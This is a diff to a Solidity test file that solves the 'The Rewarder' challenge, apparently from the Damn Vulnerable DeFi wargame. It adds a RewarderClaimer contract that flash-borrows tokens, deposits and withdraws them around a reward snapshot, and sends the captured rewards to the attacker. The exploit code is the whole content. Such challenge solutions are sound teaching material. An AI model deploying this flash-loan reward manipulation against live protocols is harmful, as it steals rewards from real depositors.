@@ -88,7 +88,11 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.warp(block.timestamp + 5 days);
+        vm.startPrank(attacker);
+        RewarderClaimer claimer = new RewarderClaimer(address(flashLoanerPool), address(theRewarderPool), address(dvt));
+        claimer.attack(TOKENS_IN_LENDER_POOL);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -116,5 +120,33 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract RewarderClaimer {
+    FlashLoanerPool flashLoanerPool;
+    TheRewarderPool rewarderPool;
+    DamnValuableToken dvt;
+    RewardToken rewardToken;
+
+    constructor(address flashPoolAddr, address rewarderPoolAddr, address dvtAddr) {
+        flashLoanerPool = FlashLoanerPool(flashPoolAddr);
+        rewarderPool = TheRewarderPool(rewarderPoolAddr);
+        dvt = DamnValuableToken(dvtAddr);
+        rewardToken = rewarderPool.rewardToken();
+    }
+
+    function attack(uint256 amount) external {
+        flashLoanerPool.flashLoan(amount);
+
+        uint256 rewardTokenAmount = rewardToken.balanceOf(address(this));
+        rewardToken.transfer(msg.sender, rewardTokenAmount);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        dvt.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+        rewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanerPool), amount);
     }
 }
